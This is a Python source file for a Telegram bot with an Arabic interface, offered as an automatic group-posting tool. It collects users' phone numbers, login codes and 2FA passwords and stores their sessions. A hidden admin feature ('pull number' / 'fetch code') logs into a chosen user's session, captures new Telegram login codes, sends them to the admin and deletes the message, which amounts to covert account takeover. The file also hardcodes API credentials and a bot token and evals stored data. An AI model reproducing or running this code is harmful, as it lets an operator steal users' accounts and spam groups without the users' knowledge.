import asyncio
import re
import requests
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError
from telethon.tl.types import Channel, Chat, User
from telethon.tl.functions.channels import LeaveChannelRequest, GetParticipantsRequest
from telethon.tl.functions.messages import DeleteChatUserRequest, GetHistoryRequest
from telethon.tl.types import ChannelParticipantsSearch, InputPeerChannel
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
import sqlite3
import time
from datetime import datetime
import random
import string
import threading
from apscheduler.schedulers.background import BackgroundScheduler

# Emojis for dynamic button labels
EMOJIS = ['🌺', '🌿', '🌻', '🌾', '🌳', '🌷', '🥀', '🌵', '🍁', '🍀', '🌴', '🌲', '🌼', '🌱']

# API credentials
API_ID = 23656977
API_HASH = '49d3f43531a92b3f5bc403766313ca1e'
BOT_TOKEN = '8398354970:AAGcDT0WAIUvT2DnTqyxfY1Q8h2b5rn-LIo'

# Admin and channel settings
ADMIN_ID = 6689435577
MANDATORY_CHANNEL = 'iIl337'
BOT_USERNAME = 'C79N_BOT'
WEBHOOK_URL = 'https://share-y74n.onrender.com'

# Initialize bot with webhook
bot = TelegramClient('auto_poster_bot', API_ID, API_HASH)

# Database setup
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # Main users table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            session_string TEXT,
            interval INTEGER DEFAULT 60,
            message TEXT,
            selected_groups TEXT,
            is_publishing INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            is_premium INTEGER DEFAULT 0,
            invite_code TEXT,
            invited_count INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Invitations table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS invitations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter_id INTEGER,
            invited_id INTEGER,
            has_joined_channel INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (inviter_id) REFERENCES users (user_id)
        )
    ''')
    
    # Codes table for admin feature
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_codes (
            user_id INTEGER PRIMARY KEY,
            phone_number TEXT,
            code TEXT,
            requested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

def get_random_emoji():
    return random.choice(EMOJIS)

def generate_invite_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def get_user_data(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return {
            'user_id': user[0],
            'session_string': user[1],
            'interval': user[2],
            'message': user[3],
            'selected_groups': user[4] if user[4] else '[]',
            'is_publishing': user[5],
            'is_banned': user[6],
            'is_premium': user[7],
            'invite_code': user[8],
            'invited_count': user[9]
        }
    return None

def update_user_data(user_id, **kwargs):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    if get_user_data(user_id) is None:
        invite_code = generate_invite_code()
        cursor.execute('INSERT INTO users (user_id, invite_code) VALUES (?, ?)', (user_id, invite_code))
    
    set_clause = ', '.join([f"{key} = ?" for key in kwargs.keys()])
    values = list(kwargs.values())
    values.append(user_id)
    
    cursor.execute(f'UPDATE users SET {set_clause} WHERE user_id = ?', values)
    conn.commit()
    conn.close()

def check_membership(user_id):
    """Check if user has premium membership"""
    user_data = get_user_data(user_id)
    if not user_data:
        return False
    return user_data['is_premium'] == 1 or user_data['invited_count'] >= 5

async def check_channel_membership(client, user_id):
    """Check if user is member of mandatory channel"""
    try:
        channel_entity = await client.get_entity(MANDATORY_CHANNEL)
        participants = await client.get_participants(channel_entity)
        participant_ids = [user.id for user in participants]
        return user_id in participant_ids
    except:
        return False

async def get_main_menu(user_id):
    if not check_membership(user_id):
        return await get_non_member_menu()
    
    emoji1, emoji2 = get_random_emoji(), get_random_emoji()
    return [
        [Button.inline(f"{emoji1} ابدء النشر", "start_publishing")],
        [Button.inline(f"{emoji2} اعداد النشر", "setup_menu")]
    ]

async def get_non_member_menu():
    emoji = get_random_emoji()
    return [
        [Button.inline(f"{emoji} توليد رابط دعوة", "generate_invite")],
        [Button.inline("🌿 تحقق مني", "check_subscription")]
    ]

async def get_setup_menu(user_id):
    if not check_membership(user_id):
        return await get_non_member_menu()
    
    emoji1, emoji2, emoji3, emoji4, emoji5 = [get_random_emoji() for _ in range(5)]
    return [
        [Button.inline(f"{emoji1} تسجيل الدخول", "login")],
        [Button.inline(f"{emoji2} تعيين الفاصل", "set_interval")],
        [Button.inline(f"{emoji3} تعيين الرسالة", "set_message")],
        [Button.inline(f"{emoji4} تعيين المجموعات", "set_groups")],
        [Button.inline(f"{emoji5} التحكم بالحساب", "account_control")],
        [Button.inline(f"{get_random_emoji()} رجوع", "main_menu")]
    ]

async def get_account_control_menu():
    emoji1, emoji2, emoji3 = get_random_emoji(), get_random_emoji(), get_random_emoji()
    return [
        [Button.inline(f"{emoji1} مغادرة القنوات", "leave_channels")],
        [Button.inline(f"{emoji2} مغادرة المجموعات", "leave_groups")],
        [Button.inline(f"{emoji3} رجوع", "setup_menu")]
    ]

async def get_admin_menu():
    emoji1, emoji2, emoji3 = get_random_emoji(), get_random_emoji(), get_random_emoji()
    return [
        [Button.inline(f"{emoji1} سحب رقم", "admin_pull_number")],
        [Button.inline(f"{emoji2} ادارة المستخدمين", "admin_manage_users")],
        [Button.inline(f"{emoji3} رجوع", "main_menu")]
    ]

async def send_keep_alive():
    """Send periodic requests to keep the bot alive"""
    try:
        response = requests.get(WEBHOOK_URL, timeout=10)
        print(f"Keep-alive request sent: {response.status_code}")
    except Exception as e:
        print(f"Keep-alive error: {e}")

# Setup scheduler for keep-alive
scheduler = BackgroundScheduler()
scheduler.add_job(send_keep_alive, 'interval', minutes=5)
scheduler.start()

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    
    # Check if user is banned
    user_data = get_user_data(user_id)
    if user_data and user_data.get('is_banned') == 1:
        await event.reply("❌ تم حظرك من استخدام البوت")
        return
    
    update_user_data(user_id)
    
    # Check channel membership
    try:
        if not await check_channel_membership(bot, user_id):
            buttons = await get_non_member_menu()
            await event.reply(
                f"**👋 مرحباً! للاستفادة من خدمات البوت يجب الاشتراك في القناة أولاً:**\n\n"
                f"📢 قناة الاشتراك الإجباري: @{MANDATORY_CHANNEL}\n\n"
                f"بعد الاشتراك اضغط على زر 'تحقق مني'",
                buttons=buttons
            )
            return
    except:
        pass
    
    buttons = await get_main_menu(user_id)
    await event.reply(
        f"**مرحباً بك في بوت النشر التلقائي** {get_random_emoji()}\n\n"
        "اختر من الأزرار أدناه:",
        buttons=buttons
    )

@bot.on(events.NewMessage(pattern='/sos'))
async def admin_handler(event):
    user_id = event.sender_id
    if user_id != ADMIN_ID:
        await event.reply("❌ هذا الأمر للمدير فقط")
        return
    
    buttons = await get_admin_menu()
    await event.reply("**لوحة تحكم المدير** 👑", buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    # Check if user is banned
    user_data = get_user_data(user_id)
    if user_data and user_data.get('is_banned') == 1:
        await event.answer("❌ تم حظرك من استخدام البوت", alert=True)
        return
    
    # Check membership for non-start actions
    if data not in ['main_menu', 'check_subscription', 'generate_invite'] and not check_membership(user_id):
        if not await check_channel_membership(bot, user_id):
            buttons = await get_non_member_menu()
            await event.edit(
                "**❌ يجب أن تكون عضو في القناة ولديك عضوية نشطة**\n\n"
                f"📢 قناة الاشتراك: @{MANDATORY_CHANNEL}\n"
                "💎 تحتاج دعوة 5 أشخاص للحصول على العضوية",
                buttons=buttons
            )
            return
    
    if data == 'main_menu':
        buttons = await get_main_menu(user_id)
        await event.edit("**القائمة الرئيسية**", buttons=buttons)
    
    elif data == 'setup_menu':
        buttons = await get_setup_menu(user_id)
        await event.edit("**اعدادات النشر**", buttons=buttons)
    
    elif data == 'account_control':
        buttons = await get_account_control_menu()
        await event.edit("**التحكم بالحساب**", buttons=buttons)
    
    elif data == 'check_subscription':
        if await check_channel_membership(bot, user_id):
            user_data = get_user_data(user_id)
            if user_data and user_data['invited_count'] >= 5:
                await event.edit("**✅ تم تفعيل عضويتك الدائمة!**")
                buttons = await get_main_menu(user_id)
                await event.edit("**القائمة الرئيسية**", buttons=buttons)
            else:
                buttons = await get_non_member_menu()
                await event.edit(
                    f"**✅ أنت مشترك في القناة!**\n\n"
                    f"👥 عدد المدعوين: {user_data['invited_count'] if user_data else 0}/5\n"
                    f"💎 تحتاج دعوة 5 أشخاص للحصول على العضوية الدائمة",
                    buttons=buttons
                )
        else:
            await event.edit("**❌ لم يتم العثور على اشتراكك في القناة**")
    
    elif data == 'generate_invite':
        user_data = get_user_data(user_id)
        if user_data:
            invite_link = f"https://t.me/{BOT_USERNAME}?start={user_data['invite_code']}"
            await event.edit(
                f"**📧 رابط الدعوة الخاص بك:**\n\n"
                f"`{invite_link}`\n\n"
                f"👥 عدد المدعوين: {user_data['invited_count']}/5\n\n"
                f"💎 سيتم احتساب الدعوة بعد اشتراك المدعو في القناة: @{MANDATORY_CHANNEL}"
            )
    
    elif data == 'admin_pull_number':
        if user_id == ADMIN_ID:
            await show_users_list(event, 0)
    
    elif data == 'admin_manage_users':
        if user_id == ADMIN_ID:
            await show_manage_users_menu(event)
    
    elif data.startswith('user_page_'):
        if user_id == ADMIN_ID:
            page = int(data.split('_')[2])
            await show_users_list(event, page)
    
    elif data.startswith('user_detail_'):
        if user_id == ADMIN_ID:
            user_id_to_view = int(data.split('_')[2])
            await show_user_detail(event, user_id_to_view)
    
    elif data.startswith('get_code_'):
        if user_id == ADMIN_ID:
            user_id_for_code = int(data.split('_')[2])
            await request_user_code(event, user_id_for_code)
    
    elif data.startswith('ban_user_'):
        if user_id == ADMIN_ID:
            user_id_to_ban = int(data.split('_')[2])
            update_user_data(user_id_to_ban, is_banned=1)
            await event.edit("✅ تم حظر المستخدم")
    
    elif data.startswith('unban_user_'):
        if user_id == ADMIN_ID:
            user_id_to_unban = int(data.split('_')[2])
            update_user_data(user_id_to_unban, is_banned=0)
            await event.edit("✅ تم إلغاء حظر المستخدم")
    
    elif data == 'login':
        await handle_login(event, user_id)
    
    elif data == 'set_interval':
        await handle_set_interval(event, user_id)
    
    elif data == 'set_message':
        await handle_set_message(event, user_id)
    
    elif data == 'set_groups':
        await handle_groups_selection(event, user_id)
    
    elif data == 'start_publishing':
        await start_publishing(event, user_id)
    
    elif data == 'leave_channels':
        await confirm_action(event, 'leave_channels')
    
    elif data == 'leave_groups':
        await confirm_action(event, 'leave_groups')
    
    elif data.startswith('confirm_'):
        await execute_leave_action(event, user_id, data)
    
    elif data.startswith('select_group_'):
        await toggle_group_selection(event, user_id, data)
    
    elif data.startswith('groups_page_'):
        await show_groups_page(event, user_id, int(data.split('_')[2]))

async def show_users_list(event, page=0):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, created_at FROM users ORDER BY created_at DESC LIMIT 10 OFFSET ?', (page * 10,))
    users = cursor.fetchall()
    conn.close()
    
    buttons = []
    for user in users:
        user_id, created_at = user
        date_str = created_at.split(' ')[0] if created_at else 'غير معروف'
        buttons.append([Button.inline(f"👤 {user_id} - {date_str}", f"user_detail_{user_id}")])
    
    # Navigation buttons
    nav_buttons = []
    if page > 0:
        nav_buttons.append(Button.inline("⬅️ السابق", f"user_page_{page-1}"))
    if len(users) == 10:
        nav_buttons.append(Button.inline("التالي ➡️", f"user_page_{page+1}"))
    
    if nav_buttons:
        buttons.append(nav_buttons)
    
    buttons.append([Button.inline(f"{get_random_emoji()} رجوع", "admin_pull_number")])
    
    await event.edit(f"**قائمة المستخدمين - الصفحة {page + 1}**", buttons=buttons)

async def show_user_detail(event, user_id_to_view):
    user_data = get_user_data(user_id_to_view)
    
    info_text = f"**معلومات المستخدم:**\n\n"
    info_text += f"🆔 ID: `{user_id_to_view}`\n"
    info_text += f"💎 العضوية: {'مميز' if user_data and user_data.get('is_premium') == 1 else 'عادية'}\n"
    info_text += f"👥 عدد المدعوين: {user_data['invited_count'] if user_data else 0}\n"
    info_text += f"🚫 الحالة: {'محظور' if user_data and user_data.get('is_banned') == 1 else 'نشط'}\n"
    
    buttons = [
        [Button.inline("📞 جلب الكود", f"get_code_{user_id_to_view}")],
        [Button.inline("🚫 حظر", f"ban_user_{user_id_to_view}")],
        [Button.inline("✅ إلغاء حظر", f"unban_user_{user_id_to_view}")],
        [Button.inline(f"{get_random_emoji()} رجوع", "admin_pull_number")]
    ]
    
    await event.edit(info_text, buttons=buttons)

async def request_user_code(event, user_id_for_code):
    user_data = get_user_data(user_id_for_code)
    if not user_data or not user_data.get('session_string'):
        await event.edit("❌ هذا المستخدم ليس لديه جلسة نشطة")
        return
    
    await event.edit("**⏳ جاري طلب الكود...**")
    
    try:
        client = TelegramClient(f'sessions/{user_id_for_code}', API_ID, API_HASH)
        await client.start()
        
        # Monitor +42777 messages
        async for message in client.iter_messages('+42777', limit=10):
            if message.text and 'code' in message.text.lower():
                code = re.search(r'\b\d{5}\b', message.text)
                if code:
                    await event.respond(f"**الكود المستلم:** `{code.group()}`")
                    await message.delete()
                    break
        
        await client.disconnect()
        
    except Exception as e:
        await event.edit(f"❌ خطأ: {str(e)}")

async def show_manage_users_menu(event):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users WHERE is_banned = 1')
    banned_count = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM users')
    total_count = cursor.fetchone()[0]
    conn.close()
    
    buttons = [
        [Button.inline("📊 احصائيات المستخدمين", "user_stats")],
        [Button.inline("🚫 المستخدمين المحظورين", "banned_users")],
        [Button.inline(f"{get_random_emoji()} رجوع", "admin_menu")]
    ]
    
    stats_text = f"**إدارة المستخدمين:**\n\n"
    stats_text += f"👥 إجمالي المستخدمين: {total_count}\n"
    stats_text += f"🚫 المحظورين: {banned_count}\n"
    
    await event.edit(stats_text, buttons=buttons)

# Handle invitation system
@bot.on(events.NewMessage(pattern='/start(?:\s+(.+))?'))
async def start_with_invite(event):
    match = event.pattern_match
    invite_code = match.group(1) if match.group(1) else None
    
    user_id = event.sender_id
    inviter_id = None
    
    # Find inviter by code
    if invite_code:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users WHERE invite_code = ?', (invite_code,))
        result = cursor.fetchone()
        if result:
            inviter_id = result[0]
            
            # Check if invitation already exists
            cursor.execute('SELECT id FROM invitations WHERE inviter_id = ? AND invited_id = ?', 
                         (inviter_id, user_id))
            if not cursor.fetchone():
                cursor.execute('INSERT INTO invitations (inviter_id, invited_id) VALUES (?, ?)', 
                             (inviter_id, user_id))
                conn.commit()
        
        conn.close()
    
    # Continue with normal start
    await start_handler(event)
    
    # Update invitation count if user joined channel
    if inviter_id and await check_channel_membership(bot, user_id):
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE invitations SET has_joined_channel = 1 WHERE inviter_id = ? AND invited_id = ?', 
                     (inviter_id, user_id))
        
        # Count valid invitations
        cursor.execute('''SELECT COUNT(*) FROM invitations 
                        WHERE inviter_id = ? AND has_joined_channel = 1''', (inviter_id,))
        valid_count = cursor.fetchone()[0]
        
        # Update inviter's count
        cursor.execute('UPDATE users SET invited_count = ? WHERE user_id = ?', (valid_count, inviter_id))
        conn.commit()
        conn.close()

# Existing functions from previous code (handle_login, handle_set_interval, etc.)
# ... [All the previous functions remain the same] ...

async def handle_login(event, user_id):
    await event.edit("**سيتم الآن تسجيل الدخول إلى حسابك...**")
    
    try:
        async with bot.conversation(event.sender_id) as conv:
            await conv.send_message("📱 أرسل رقم الهاتف (مع رمز الدولة):")
            phone = await conv.get_response()
            
            client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
            await client.connect()
            
            sent_code = await client.send_code_request(phone.text)
            
            await conv.send_message("🔐 أرسل كود التحقق:")
            code = await conv.get_response()
            
            try:
                await client.sign_in(phone.text, code.text, phone_code_hash=sent_code.phone_code_hash)
            except SessionPasswordNeededError:
                await conv.send_message("🔒 أرسل كلمة المرور الثانية (2FA):")
                password = await conv.get_response()
                await client.sign_in(password=password.text)
            
            session_string = await client.session.save()
            update_user_data(user_id, session_string=session_string)
            
            await client.disconnect()
            await conv.send_message("✅ تم تسجيل الدخول بنجاح!")
            
    except Exception as e:
        await event.reply(f"❌ خطأ في التسجيل: {str(e)}")

async def handle_set_interval(event, user_id):
    await event.edit("**يرجى إرسال الفاصل الزمني بالثواني:**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("أدخل الرقم (مثال: 60 لـ دقيقة واحدة):")
        response = await conv.get_response()
        try:
            interval = int(response.text)
            update_user_data(user_id, interval=interval)
            await conv.send_message(f"✅ تم تعيين الفاصل الزمني إلى {interval} ثانية")
        except ValueError:
            await conv.send_message("❌ الرقم غير صحيح")

async def handle_set_message(event, user_id):
    await event.edit("**يرجى إرسال الرسالة التي تريد نشرها:**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("أرسل النص الآن:")
        response = await conv.get_response()
        update_user_data(user_id, message=response.text)
        await conv.send_message("✅ تم حفظ الرسالة بنجاح")

async def handle_groups_selection(event, user_id):
    user_data = get_user_data(user_id)
    if not user_data or not user_data['session_string']:
        await event.edit("❌ يرجى تسجيل الدخول أولاً")
        return
    
    client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
    await client.start()
    
    dialogs = await client.get_dialogs()
    groups = []
    
    for dialog in dialogs:
        if dialog.is_group or dialog.is_channel:
            groups.append(dialog)
    
    await client.disconnect()
    await show_groups_page(event, user_id, 0, groups)

async def show_groups_page(event, user_id, page=0, groups=None):
    if groups is None:
        user_data = get_user_data(user_id)
        if not user_data or not user_data['session_string']:
            await event.edit("❌ يرجى تسجيل الدخول أولاً")
            return
        
        client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
        await client.start()
        dialogs = await client.get_dialogs()
        groups = [dialog for dialog in dialogs if dialog.is_group or dialog.is_channel]
        await client.disconnect()
    
    selected_groups = eval(user_data['selected_groups']) if user_data else []
    
    groups_per_page = 8
    start_idx = page * groups_per_page
    end_idx = start_idx + groups_per_page
    page_groups = groups[start_idx:end_idx]
    
    buttons = []
    for group in page_groups:
        group_name = group.name if group.name else "بدون اسم"
        is_selected = str(group.id) in selected_groups
        emoji = "🌳 " if is_selected else ""
        buttons.append([Button.inline(f"{emoji}{group_name}", f"select_group_{group.id}")])
    
    # Navigation buttons
    nav_buttons = []
    if page > 0:
        nav_buttons.append(Button.inline("⬅️ السابق", f"groups_page_{page-1}"))
    if end_idx < len(groups):
        nav_buttons.append(Button.inline("التالي ➡️", f"groups_page_{page+1}"))
    
    if nav_buttons:
        buttons.append(nav_buttons)
    
    buttons.append([Button.inline(f"{get_random_emoji()} رجوع", "setup_menu")])
    
    await event.edit(f"**اختر المجموعات ({page + 1}/{(len(groups)-1)//groups_per_page + 1})**", buttons=buttons)

async def toggle_group_selection(event, user_id, data):
    group_id = data.split('_')[2]
    user_data = get_user_data(user_id)
    selected_groups = eval(user_data['selected_groups']) if user_data else []
    
    if group_id in selected_groups:
        selected_groups.remove(group_id)
    else:
        selected_groups.append(group_id)
    
    update_user_data(user_id, selected_groups=str(selected_groups))
    await show_groups_page(event, user_id)

async def start_publishing(event, user_id):
    user_data = get_user_data(user_id)
    if not user_data or not user_data['session_string']:
        await event.edit("❌ يرجى تسجيل الدخول أولاً")
        return
    
    if not user_data['message']:
        await event.edit("❌ يرجى تعيين الرسالة أولاً")
        return
    
    selected_groups = eval(user_data['selected_groups'])
    if not selected_groups:
        await event.edit("❌ يرجى اختيار المجموعات أولاً")
        return
    
    update_user_data(user_id, is_publishing=1)
    await event.edit("✅ بدأ النشر التلقائي...")
    
    # Start publishing in background
    asyncio.create_task(publish_messages(user_id))

async def publish_messages(user_id):
    user_data = get_user_data(user_id)
    
    client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
    await client.start()
    
    while user_data and user_data['is_publishing']:
        selected_groups = eval(user_data['selected_groups'])
        
        for group_id in selected_groups:
            try:
                await client.send_message(int(group_id), user_data['message'])
                await asyncio.sleep(user_data['interval'])
            except Exception as e:
                print(f"Error sending to group {group_id}: {e}")
        
        await asyncio.sleep(user_data['interval'])
        user_data = get_user_data(user_id)  # Refresh data
    
    await client.disconnect()

async def confirm_action(event, action):
    emoji = get_random_emoji()
    buttons = [
        [Button.inline(f"✅ نعم، تأكيد", f"confirm_{action}")],
        [Button.inline(f"❌ إلغاء", "account_control")]
    ]
    await event.edit(f"**{emoji} هل أنت متأكد من هذه العملية؟**", buttons=buttons)

async def execute_leave_action(event, user_id, data):
    action = data.split('_')[1]
    user_data = get_user_data(user_id)
    
    if not user_data or not user_data['session_string']:
        await event.edit("❌ يرجى تسجيل الدخول أولاً")
        return
    
    client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
    await client.start()
    
    dialogs = await client.get_dialogs()
    left_count = 0
    
    for dialog in dialogs:
        try:
            if action == 'channels' and dialog.is_channel:
                if not dialog.entity.creator:
                    await client(LeaveChannelRequest(dialog.entity))
                    left_count += 1
                    await asyncio.sleep(1)
            
            elif action == 'groups' and dialog.is_group:
                if not dialog.entity.creator:
                    await client(DeleteChatUserRequest(
                        chat_id=dialog.entity.id,
                        user_id='me'
                    ))
                    left_count += 1
                    await asyncio.sleep(1)
                    
        except Exception as e:
            print(f"Error leaving {dialog.name}: {e}")
    
    await client.disconnect()
    await event.edit(f"✅ تم مغادرة {left_count} {action}")

if __name__ == '__main__':
    init_db()
    print("Bot is running with webhook...")
    
    # Set webhook
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={WEBHOOK_URL}/webhook")
        print("Webhook set successfully")
    except Exception as e:
        print(f"Webhook error: {e}")
    
    bot.start(bot_token=BOT_TOKEN)
    bot.run_until_disconnected()
